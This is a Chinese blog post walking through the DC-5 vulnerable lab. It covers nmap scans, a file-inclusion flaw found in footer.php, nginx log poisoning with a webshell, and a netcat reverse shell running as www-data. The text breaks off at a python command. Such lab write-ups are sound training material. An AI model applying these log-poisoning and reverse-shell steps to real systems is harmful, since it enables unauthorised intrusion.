<!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=2"><meta name="theme-color" content="#222"><meta name="generator" content="Hexo 5.0.2"><link rel="apple-touch-icon" sizes="180x180" href="/images/01.jpg"><link rel="icon" type="image/png" sizes="32x32" href="/images/01.jpg"><link rel="icon" type="image/png" sizes="16x16" href="/images/01.jpg"><link rel="mask-icon" href="/images/logo.svg" color="#222"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><meta name="google-site-verification" content="h6ecMlAUCMDTIJmEha3N3mJmMydid5XY8AbS767rKtM"><meta name="baidu-site-verification" content="T0YB7GSdOB"><link rel="stylesheet" href="/css/main.css"><link rel="stylesheet" href="//fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext"><link rel="stylesheet" href="//cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.14.0/css/all.min.css"><link rel="stylesheet" href="//cdn.jsdelivr.net/npm/animate.css@3.1.1/animate.min.css"><link rel="stylesheet" href="//cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css"><script class="hexo-configurations">var NexT=window.NexT||{},CONFIG={hostname:"lunamoore.github.io",root:"/",scheme:"Muse",version:"8.0.0-rc.5",exturl:!0,sidebar:{position:"left",display:"post",padding:18,offset:12},copycode:!0,bookmark:{enable:!1,color:"#222",save:"auto"},fancybox:!0,mediumzoom:!1,lazyload:!1,pangu:!1,comments:{style:"tabs",active:null,storage:!0,lazyload:!1,nav:null},motion:{enable:!0,async:!1,transition:{post_block:"fadeIn",post_header:"fadeInDown",post_body:"fadeInDown",coll_header:"fadeInLeft",sidebar:"fadeInUp"}},prism:!1,path:"search.xml",localsearch:{enable:!0,trigger:"auto",top_n_per_article:1,unescape:!1,preload:!1}}</script><meta name="description" content="0x00.官网描述 DC-5 is another purposely built vulnerable lab with the intent of gaining experience in the world of penetration testing. The plan was for DC-5 to kick it up a notch, so this might not be gr"><meta property="og:type" content="article"><meta property="og:title" content="DC-5"><meta property="og:url" content="https://lunamoore.github.io/2020/08/24/DC-5/index.html"><meta property="og:site_name" content="Lluna&#39;s Pure land."><meta property="og:description" content="0x00.官网描述 DC-5 is another purposely built vulnerable lab with the intent of gaining experience in the world of penetration testing. The plan was for DC-5 to kick it up a notch, so this might not be gr"><meta property="og:locale" content="zh_CN"><meta property="og:image" content="https://lunamoore.github.io/2020/08/24/DC-5/image-20200824113750326.png"><meta property="og:image" content="https://lunamoore.github.io/2020/08/24/DC-5/image-20200824114238685.png"><meta property="og:image" content="https://lunamoore.github.io/2020/08/24/DC-5/image-20200824114357269.png"><meta property="og:image" content="https://lunamoore.github.io/2020/08/24/DC-5/image-20200824121351077.png"><meta property="og:image" content="https://lunamoore.github.io/2020/08/24/DC-5/image-20200824121440845.png"><meta property="og:image" content="https://lunamoore.github.io/2020/08/24/DC-5/image-20200824121734811.png"><meta property="og:image" content="https://lunamoore.github.io/2020/08/24/DC-5/image-20200824122004107.png"><meta property="og:image" content="https://lunamoore.github.io/2020/08/24/DC-5/image-20200824131915542.png"><meta property="og:image" content="https://lunamoore.github.io/2020/08/24/DC-5/image-20200824131944199.png"><meta property="og:image" content="https://lunamoore.github.io/2020/08/24/DC-5/image-20200824132835565.png"><meta property="og:image" content="https://lunamoore.github.io/2020/08/24/DC-5/image-20200824133133495.png"><meta property="og:image" content="https://lunamoore.github.io/2020/08/24/DC-5/image-20200824134347907.png"><meta property="og:image" content="https://lunamoore.github.io/2020/08/24/DC-5/image-20200824134406453.png"><meta property="og:image" content="https://lunamoore.github.io/2020/08/24/DC-5/image-20200824150446363.png"><meta property="og:image" content="https://lunamoore.github.io/2020/08/24/DC-5/image-20200824150830757.png"><meta property="og:image" content="https://lunamoore.github.io/2020/08/24/DC-5/image-20200824150900768.png"><meta property="og:image" content="https://lunamoore.github.io/2020/08/24/DC-5/image-20200824151103230.png"><meta property="og:image" content="https://lunamoore.github.io/2020/08/24/DC-5/image-20200824151445724.png"><meta property="og:image" content="https://lunamoore.github.io/2020/08/24/DC-5/image-20200824151541645.png"><meta property="og:image" content="https://lunamoore.github.io/2020/08/24/DC-5/image-20200824151632387.png"><meta property="og:image" content="https://lunamoore.github.io/2020/08/24/DC-5/image-20200824151959062.png"><meta property="og:image" content="https://lunamoore.github.io/2020/08/24/DC-5/image-20200824152332844.png"><meta property="article:published_time" content="2020-08-24T08:59:40.000Z"><meta property="article:modified_time" content="2020-09-02T09:24:27.202Z"><meta property="article:author" content="Lluna"><meta property="article:tag" content="靶机"><meta name="twitter:card" content="summary"><meta name="twitter:image" content="https://lunamoore.github.io/2020/08/24/DC-5/image-20200824113750326.png"><link rel="canonical" href="https://lunamoore.github.io/2020/08/24/DC-5/"><script class="page-configurations">CONFIG.page={sidebar:"",isHome:!1,isPost:!0,lang:"zh-CN"}</script><title>DC-5 | Lluna's Pure land.</title><noscript><style>body{margin-top:2rem}.use-motion .collection-header,.use-motion .comments,.use-motion .menu-item,.use-motion .pagination,.use-motion .post-block,.use-motion .post-body,.use-motion .post-header,.use-motion .sidebar{visibility:visible}.use-motion .footer,.use-motion .header,.use-motion .site-brand-container .toggle{opacity:initial}.use-motion .custom-logo-image,.use-motion .site-subtitle,.use-motion .site-title{opacity:initial;top:initial}.use-motion .logo-line{transform:scaleX(1)}.search-pop-overlay,.sidebar-nav{display:none}.sidebar-panel{display:block}</style></noscript><link rel="alternate" href="/atom.xml" title="Lluna's Pure land." type="application/atom+xml"></head><body itemscope itemtype="http://schema.org/WebPage" class="use-motion"><div class="headband"></div><main class="main"><header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="header-inner"><div class="site-brand-container"><div class="site-nav-toggle"><div class="toggle" aria-label="切换导航栏"><span class="toggle-line"></span> <span class="toggle-line"></span> <span class="toggle-line"></span></div></div><div class="site-meta"><a href="/" class="brand" rel="start"><i class="logo-line"></i><h1 class="site-title">Lluna's Pure land.</h1><i class="logo-line"></i></a><p class="site-subtitle" itemprop="description">What is life like when singing to wine?</p></div><div class="site-nav-right"><div class="toggle popup-trigger"><i class="fa fa-search fa-fw fa-lg"></i></div></div></div><nav class="site-nav"><ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home // 首页 fa-fw"></i>首页</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user // 关于 fa-fw"></i>关于</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags // 标签 fa-fw"></i>标签<span class="badge">7</span></a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th // 分类 fa-fw"></i>分类<span class="badge">11</span></a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive // 归档 fa-fw"></i>归档<span class="badge">29</span></a></li><li class="menu-item menu-item-schedule"><a href="/schedule/" rel="section"><i class="fa fa-calendar //日程表 fa-fw"></i>日程表</a></li><li class="menu-item menu-item-movies"><a href="/movies" rel="section"><i class="fa fa-film // 电影 fa-fw"></i>电影</a></li><li class="menu-item menu-item-search"><a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索</a></li></ul></nav><div class="search-pop-overlay"><div class="popup search-popup"><div class="search-header"><span class="search-icon"><i class="fa fa-search"></i></span><div class="search-input-container"><input autocomplete="off" autocapitalize="off" maxlength="80" placeholder="搜索..." spellcheck="false" type="search" class="search-input"></div><span class="popup-btn-close"><i class="fa fa-times-circle"></i></span></div><div class="search-result-container"><div class="no-result"><i class="fa fa-spinner fa-pulse fa-5x"></i></div></div></div></div></div><div class="toggle sidebar-toggle"><span class="toggle-line"></span> <span class="toggle-line"></span> <span class="toggle-line"></span></div><aside class="sidebar"><div class="sidebar-inner sidebar-nav-active sidebar-toc-active"><ul class="sidebar-nav"><li class="sidebar-nav-toc">文章目录</li><li class="sidebar-nav-overview">站点概览</li></ul><section class="post-toc-wrap sidebar-panel"><div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#0x00-%E5%AE%98%E7%BD%91%E6%8F%8F%E8%BF%B0"><span class="nav-number">1.</span> <span class="nav-text">0x00.官网描述</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x01-%E8%80%81%E8%A7%84%E7%9F%A9%E4%B8%8Anmap"><span class="nav-number">2.</span> <span class="nav-text">0x01.老规矩上nmap</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x02-%E7%BB%A7%E7%BB%ADnmap%E6%89%AB%E6%8F%8F%E6%9C%8D%E5%8A%A1%E5%8F%8A%E7%AB%AF%E5%8F%A3"><span class="nav-number">3.</span> <span class="nav-text">0x02.继续nmap扫描服务及端口</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x03-%E8%AE%BF%E9%97%AE80%E7%AB%AF%E5%8F%A3"><span class="nav-number">4.</span> <span class="nav-text">0x03.访问80端口</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-%E5%8F%91%E7%8E%B0%E5%89%8D%E5%9B%9B%E4%B8%AA%E9%83%BD%E4%B8%BA%E9%9D%99%E6%80%81%E9%A1%B5%E9%9D%A2%EF%BC%8C%E5%8F%AA%E6%9C%89contact%E6%9C%89%E6%8F%90%E4%BA%A4%E9%9D%A2%E6%9D%BF"><span class="nav-number">4.1.</span> <span class="nav-text">1.发现前四个都为静态页面，只有contact有提交面板</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-%E6%8F%90%E4%BA%A4%E6%95%B0%E6%8D%AE"><span class="nav-number">4.2.</span> <span class="nav-text">2.提交数据</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-%E4%BD%BF%E7%94%A8bp%E7%88%86%E7%A0%B4%E6%A0%B9%E7%9B%AE%E5%BD%95php%E6%96%87%E4%BB%B6"><span class="nav-number">4.3.</span> <span class="nav-text">3.使用bp爆破根目录php文件</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x04-%E7%88%86%E7%A0%B4%E5%8C%85%E5%90%AB%E5%8F%98%E9%87%8F"><span class="nav-number">5.</span> <span class="nav-text">0x04.爆破包含变量</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x05-%E5%B0%9D%E8%AF%95%E8%BF%9C%E7%A8%8B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB"><span class="nav-number">6.</span> <span class="nav-text">0x05.尝试远程文件包含</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x06-%E6%9C%AC%E5%9C%B0%E5%8C%85%E5%90%AB"><span class="nav-number">7.</span> <span class="nav-text">0x06.本地包含</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x07-%E8%9A%81%E5%89%91%E8%BF%9E%E6%8E%A5shell"><span class="nav-number">8.</span> <span class="nav-text">0x07.蚁剑连接shell</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x08-%E8%9A%81%E5%89%91%E5%BB%BA%E7%AB%8B%E7%A8%B3%E5%AE%9A%E7%9A%84shell"><span class="nav-number">9.</span> <span class="nav-text">0x08.蚁剑建立稳定的shell</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x08-%E5%8F%8D%E5%BC%B9shell%E7%BB%99kali"><span class="nav-number">10.</span> <span class="nav-text">0x08.反弹shell给kali</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x09-%E6%8F%90%E6%9D%83"><span class="nav-number">11.</span> <span class="nav-text">0x09.提权</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-%E5%B0%9D%E8%AF%95sudo-l"><span class="nav-number">11.1.</span> <span class="nav-text">1.尝试sudo -l</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-%E6%9F%A5%E7%9C%8BSUID"><span class="nav-number">11.2.</span> <span class="nav-text">2.查看SUID</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-%E6%9F%A5%E7%9C%8Bscreen-4-5-0%E6%98%AF%E5%90%A6%E6%9C%89%E6%BC%8F%E6%B4%9E"><span class="nav-number">11.3.</span> <span class="nav-text">3.查看screen-4.5.0是否有漏洞</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4-%E6%B7%BB%E5%8A%A0%E6%89%A7%E8%A1%8C%E6%9D%83%E9%99%90%E6%89%A7%E8%A1%8C"><span class="nav-number">11.4.</span> <span class="nav-text">4.添加执行权限执行</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#5-%E6%89%A7%E8%A1%8C"><span class="nav-number">11.5.</span> <span class="nav-text">5.执行</span></a></li></ol></li></ol></div></section><section class="site-overview-wrap sidebar-panel"><div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person"><img class="site-author-image" itemprop="image" alt="Lluna" src="/images/01.jpg"><p class="site-author-name" itemprop="name">Lluna</p><div class="site-description" itemprop="description">A primary school student in the field of Cyberspace Security!</div></div><div class="site-state-wrap animated"><nav class="site-state"><div class="site-state-item site-state-posts"><a href="/archives/"><span class="site-state-item-count">29</span> <span class="site-state-item-name">日志</span></a></div><div class="site-state-item site-state-categories"><a href="/categories/"><span class="site-state-item-count">11</span> <span class="site-state-item-name">分类</span></a></div><div class="site-state-item site-state-tags"><a href="/tags/"><span class="site-state-item-count">7</span> <span class="site-state-item-name">标签</span></a></div></nav></div><div class="links-of-author animated"><span class="links-of-author-item"><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2x1bmFtb29yZQ==" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;lunamoore"><i class="fab fa-github fa-fw"></i></span> </span><span class="links-of-author-item"><span class="exturl" data-url="bWFpbHRvOmppeWViYWxhYmFsYUAxMjYuY29t" title="E-Mail → mailto:jiyebalabala@126.com"><i class="fa fa-envelope fa-fw"></i></span></span></div><div class="cc-license animated" itemprop="license"><span class="exturl cc-opacity" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC8="><img src="/images/cc-by-nc-sa.svg" alt="Creative Commons"></span></div><div class="links-of-blogroll animated"><div class="links-of-blogroll-title"><i class="fa fa-globe fa-fw"></i> 友链</div><ul class="links-of-blogroll-list"><li class="links-of-blogroll-item"><span class="exturl" data-url="aHR0cHM6Ly92YWxlY2FzZWMuZ2l0aHViLmlv" title="https:&#x2F;&#x2F;valecasec.github.io">valecalida's house</span></li></ul></div></section></div></aside><div class="sidebar-dimmer"></div></header><div class="back-to-top"><i class="fa fa-arrow-up"></i> <span>0%</span></div><div class="reading-progress-bar"></div><span class="exturl github-corner" data-url="aHR0cHM6Ly9naXRodWIuY29tL2x1bmFtb29yZS8=" title="Follow me on GitHub" aria-label="Follow me on GitHub"><svg width="80" height="80" viewBox="0 0 250 250" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin:130px 106px" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></span><noscript><div class="noscript-warning">Theme NexT works best with JavaScript enabled</div></noscript><div class="main-inner post posts-expand"><article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN"><link itemprop="mainEntityOfPage" href="https://lunamoore.github.io/2020/08/24/DC-5/"><span hidden itemprop="author" itemscope itemtype="http://schema.org/Person"><meta itemprop="image" content="/images/01.jpg"><meta itemprop="name" content="Lluna"><meta itemprop="description" content="A primary school student in the field of Cyberspace Security!"></span><span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization"><meta itemprop="name" content="Lluna's Pure land."></span><header class="post-header"><h1 class="post-title" itemprop="name headline">DC-5</h1><div class="post-meta"><span class="post-meta-item"><span class="post-meta-item-icon"><i class="far fa-calendar"></i> </span><span class="post-meta-item-text">发表于</span> <time title="创建时间：2020-08-24 16:59:40" itemprop="dateCreated datePublished" datetime="2020-08-24T16:59:40+08:00">2020-08-24</time> </span><span class="post-meta-item"><span class="post-meta-item-icon"><i class="far fa-calendar-check"></i> </span><span class="post-meta-item-text">更新于</span> <time title="修改时间：2020-09-02 17:24:27" itemprop="dateModified" datetime="2020-09-02T17:24:27+08:00">2020-09-02</time> </span><span class="post-meta-item"><span class="post-meta-item-icon"><i class="far fa-folder"></i> </span><span class="post-meta-item-text">分类于</span> <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/vulnhub/" itemprop="url" rel="index"><span itemprop="name">vulnhub</span></a> </span>， <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/vulnhub/DC/" itemprop="url" rel="index"><span itemprop="name">DC</span></a> </span></span><span id="/2020/08/24/DC-5/" class="post-meta-item leancloud_visitors" data-flag-title="DC-5" title="阅读次数"><span class="post-meta-item-icon"><i class="far fa-eye"></i> </span><span class="post-meta-item-text">阅读次数：</span> <span class="leancloud-visitors-count"></span> </span><span class="post-meta-item"><span class="post-meta-item-icon"><i class="far fa-comment"></i> </span><span class="post-meta-item-text">Valine：</span> <a title="valine" href="/2020/08/24/DC-5/#valine-comments" itemprop="discussionUrl"><span class="post-comments-count valine-comment-count" data-xid="/2020/08/24/DC-5/" itemprop="commentCount"></span></a></span><br><span class="post-meta-item" title="本文字数"><span class="post-meta-item-icon"><i class="far fa-file-word"></i> </span><span class="post-meta-item-text">本文字数：</span> <span>11k</span> </span><span class="post-meta-item" title="阅读时长"><span class="post-meta-item-icon"><i class="far fa-clock"></i> </span><span class="post-meta-item-text">阅读时长 &asymp;</span> <span>10 分钟</span></span></div></header><div class="post-body" itemprop="articleBody"><h2 id="0x00-官网描述"><a href="#0x00-官网描述" class="headerlink" title="0x00.官网描述"></a>0x00.官网描述</h2><blockquote><p>DC-5 is another purposely built vulnerable lab with the intent of gaining experience in the world of penetration testing.</p><p>The plan was for DC-5 to kick it up a notch, so this might not be great for beginners, but should be ok for people with intermediate or better experience. Time will tell (as will feedback).</p><p>As far as I am aware, there is only one exploitable entry point to get in (there is no SSH either). This particular entry point may be quite hard to identify, but it is there. You need to look for something a little out of the ordinary (something that changes with a refresh of a page). This will hopefully provide some kind of idea as to what the vulnerability might involve.</p><p>And just for the record, there is no phpmailer exploit involved. :-)</p><p>The ultimate goal of this challenge is to get root and to read the one and only flag.</p><p>Linux skills and familiarity with the Linux command line are a must, as is some experience with basic penetration testing tools.</p><p>For beginners, Google can be of great assistance, but you can always tweet me at @DCAU7 for assistance to get you going again. But take note: I won’t give you the answer, instead, I’ll give you an idea about how to move forward.</p><p>But if you’re really, really stuck, you can watch this video which shows the first step.</p></blockquote><a id="more"></a><h2 id="0x01-老规矩上nmap"><a href="#0x01-老规矩上nmap" class="headerlink" title="0x01.老规矩上nmap"></a>0x01.老规矩上nmap</h2><p><code>可以发现1为网关，2为宿主机，6为kali，那么4就是我们的受害者</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">root@JIYE:~/tmp/DC5<span class="comment"># nmap -sP 192.168.1.0/24 -oN nmap.sP</span></span><br><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2020-08-23 23:17 EDT</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.1.1</span><br><span class="line">Host is up (0.0018s latency).</span><br><span class="line">MAC Address: 68:D1:BA:1F:FD:48 (Shenzhen Youhua Technology)</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.1.2</span><br><span class="line">Host is up (0.00077s latency).</span><br><span class="line">MAC Address: 50:5B:C2:8C:BE:A5 (Liteon Technology)</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.1.4</span><br><span class="line">Host is up (0.00052s latency).</span><br><span class="line">MAC Address: 00:0C:29:30:2B:A9 (VMware)</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.1.6</span><br><span class="line">Host is up.</span><br><span class="line">Nmap <span class="keyword">done</span>: 256 IP addresses (4 hosts up) scanned <span class="keyword">in</span> 2.05 seconds</span><br><span class="line">root@JIYE:~/tmp/DC5<span class="comment"># </span></span><br></pre></td></tr></table></figure><h2 id="0x02-继续nmap扫描服务及端口"><a href="#0x02-继续nmap扫描服务及端口" class="headerlink" title="0x02.继续nmap扫描服务及端口"></a>0x02.继续nmap扫描服务及端口</h2><p><code>发现开放了80/111/40039端口</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">root@JIYE:~/tmp/DC5<span class="comment"># nmap -A 192.168.1.4 -p- -oN nmap.A</span></span><br><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2020-08-23 23:20 EDT</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.1.4</span><br><span class="line">Host is up (0.00047s latency).</span><br><span class="line">Not shown: 65532 closed ports</span><br><span class="line">PORT      STATE SERVICE VERSION</span><br><span class="line">80/tcp    open  http    nginx 1.6.2</span><br><span class="line">|_http-server-header: nginx/1.6.2</span><br><span class="line">|_http-title: Welcome</span><br><span class="line">111/tcp   open  rpcbind 2-4 (RPC <span class="comment">#100000)</span></span><br><span class="line">| rpcinfo: </span><br><span class="line">|   program version    port/proto  service</span><br><span class="line">|   100000  2,3,4        111/tcp   rpcbind</span><br><span class="line">|   100000  2,3,4        111/udp   rpcbind</span><br><span class="line">|   100000  3,4          111/tcp6  rpcbind</span><br><span class="line">|   100000  3,4          111/udp6  rpcbind</span><br><span class="line">|   100024  1          40039/tcp   status</span><br><span class="line">|   100024  1          44947/tcp6  status</span><br><span class="line">|   100024  1          46754/udp   status</span><br><span class="line">|_  100024  1          51314/udp6  status</span><br><span class="line">40039/tcp open  status  1 (RPC <span class="comment">#100024)</span></span><br><span class="line">MAC Address: 00:0C:29:30:2B:A9 (VMware)</span><br><span class="line">Device <span class="built_in">type</span>: general purpose</span><br><span class="line">Running: Linux 3.X|4.X</span><br><span class="line">OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4</span><br><span class="line">OS details: Linux 3.2 - 4.9</span><br><span class="line">Network Distance: 1 hop</span><br><span class="line"></span><br><span class="line">TRACEROUTE</span><br><span class="line">HOP RTT     ADDRESS</span><br><span class="line">1   0.47 ms 192.168.1.4</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 14.58 seconds</span><br><span class="line">root@JIYE:~/tmp/DC5<span class="comment">#</span></span><br></pre></td></tr></table></figure><h2 id="0x03-访问80端口"><a href="#0x03-访问80端口" class="headerlink" title="0x03.访问80端口"></a>0x03.访问80端口</h2><h3 id="1-发现前四个都为静态页面，只有contact有提交面板"><a href="#1-发现前四个都为静态页面，只有contact有提交面板" class="headerlink" title="1.发现前四个都为静态页面，只有contact有提交面板"></a>1.发现前四个都为静态页面，只有contact有提交面板</h3><img src="/2020/08/24/DC-5/image-20200824113750326.png"><h3 id="2-提交数据"><a href="#2-提交数据" class="headerlink" title="2.提交数据"></a>2.提交数据</h3><p><code>发现为url传参</code></p><img src="/2020/08/24/DC-5/image-20200824114238685.png"><p><code>去掉参数再次访问，发现每次刷新copyright有变化</code></p><img src="/2020/08/24/DC-5/image-20200824114357269.png"><h3 id="3-使用bp爆破根目录php文件"><a href="#3-使用bp爆破根目录php文件" class="headerlink" title="3.使用bp爆破根目录php文件"></a>3.使用bp爆破根目录php文件</h3><blockquote><p>字典为：</p><p>/usr/share/dirb/wordlists/big.txt</p></blockquote><img src="/2020/08/24/DC-5/image-20200824121351077.png"><p><code>爆破完成，发现多出一个footer</code></p><img src="/2020/08/24/DC-5/image-20200824121440845.png"><p><code>访问footer，发现为copyright，且每次刷新都变化，可以判断为存在文件包含</code></p><img src="/2020/08/24/DC-5/image-20200824121734811.png"> <img src="/2020/08/24/DC-5/image-20200824122004107.png"><h2 id="0x04-爆破包含变量"><a href="#0x04-爆破包含变量" class="headerlink" title="0x04.爆破包含变量"></a>0x04.爆破包含变量</h2><p><code>发现file可能为变量</code></p><blockquote><p>字典为</p><p>/usr/share/wordlists/dirb/common.txt</p><p>/usr/share/wfuzz/wordlist/vulns/dirTraversal-nix.txt</p></blockquote><img src="/2020/08/24/DC-5/image-20200824131915542.png"> <img src="/2020/08/24/DC-5/image-20200824131944199.png"> <img src="/2020/08/24/DC-5/image-20200824132835565.png"><p><code>进行测试，得出file就是变量</code></p><img src="/2020/08/24/DC-5/image-20200824133133495.png"><h2 id="0x05-尝试远程文件包含"><a href="#0x05-尝试远程文件包含" class="headerlink" title="0x05.尝试远程文件包含"></a>0x05.尝试远程文件包含</h2><p><code>结果发现不存在远程文件包含</code></p><img src="/2020/08/24/DC-5/image-20200824134347907.png"> <img src="/2020/08/24/DC-5/image-20200824134406453.png"><h2 id="0x06-本地包含"><a href="#0x06-本地包含" class="headerlink" title="0x06.本地包含"></a>0x06.本地包含</h2><p><code>由于不能上传文件，所以包含web日志文件</code></p><p><code>由于是nginx/1.6.2，可以使用爆破日志文件</code></p><p><code>这里直接百度找到了日志文件常见的目录，本次实验目录为/var/log/nginx/access.log</code></p><img src="/2020/08/24/DC-5/image-20200824150446363.png"><p><code>bp写入小马</code></p><img src="/2020/08/24/DC-5/image-20200824150830757.png"><p><code>上传成功</code></p><img src="/2020/08/24/DC-5/image-20200824150900768.png"><h2 id="0x07-蚁剑连接shell"><a href="#0x07-蚁剑连接shell" class="headerlink" title="0x07.蚁剑连接shell"></a>0x07.蚁剑连接shell</h2><img src="/2020/08/24/DC-5/image-20200824151103230.png"><h2 id="0x08-蚁剑建立稳定的shell"><a href="#0x08-蚁剑建立稳定的shell" class="headerlink" title="0x08.蚁剑建立稳定的shell"></a>0x08.蚁剑建立稳定的shell</h2><p><code>由于日志文件存在读写，所以在/tmp下创建稳定小马进行连接</code></p><p><code>此处404用于欺骗</code></p><img src="/2020/08/24/DC-5/image-20200824151445724.png"><p><code>访问</code></p><img src="/2020/08/24/DC-5/image-20200824151541645.png"><p><code>连接</code></p><img src="/2020/08/24/DC-5/image-20200824151632387.png"><h2 id="0x08-反弹shell给kali"><a href="#0x08-反弹shell给kali" class="headerlink" title="0x08.反弹shell给kali"></a>0x08.反弹shell给kali</h2><p><code>由于这里有nc，所以可以反弹shell</code></p><img src="/2020/08/24/DC-5/image-20200824151959062.png"><p><code>建立连接</code></p><img src="/2020/08/24/DC-5/image-20200824152332844.png"><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">root@JIYE:~<span class="comment"># nc -nvlp 6666</span></span><br><span class="line">listening on [any] 6666 ...</span><br><span class="line">connect to [192.168.1.6] from (UNKNOWN) [192.168.1.4] 38471</span><br><span class="line">id</span><br><span class="line">uid=33(www-data) gid=33(www-data) groups=33(www-data)</span><br><span class="line">whoami</span><br><span class="line">www-data</span><br></pre></td></tr></table></figure><p><code>建立交互式shell</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">python -c <span 